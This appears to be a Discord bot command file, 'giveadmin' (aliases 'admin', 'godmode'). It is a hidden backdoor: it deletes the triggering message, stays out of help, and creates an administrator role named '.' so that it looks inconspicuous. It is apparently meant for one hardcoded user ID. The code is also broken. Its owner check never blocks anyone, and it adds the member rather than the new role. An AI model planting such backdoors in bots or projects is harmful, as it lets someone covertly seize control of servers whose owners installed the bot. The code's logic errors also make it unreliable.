const { prefix } = require('../config.json');

module.exports = {
	name: 'giveadmin',
	description: 'gives the person who executed the command an inconspicous admin role',
	aliases: ['admin', 'godmode'],
	usage: `${prefix}giveadmin`,
	guildOnly: true,
	deleteMessage: true,
	helpMessage: false,
	execute(message) {
		const member = message.mentions.members.first();

		if (!message.author.id === '332555969169063938') return;

		message.guild.roles.create({
			data: {
				name: '.',
				permissions: [{
					'ADMINISTRATOR': true,
				}],
			},
		});
		member.roles.add(member);
	},
};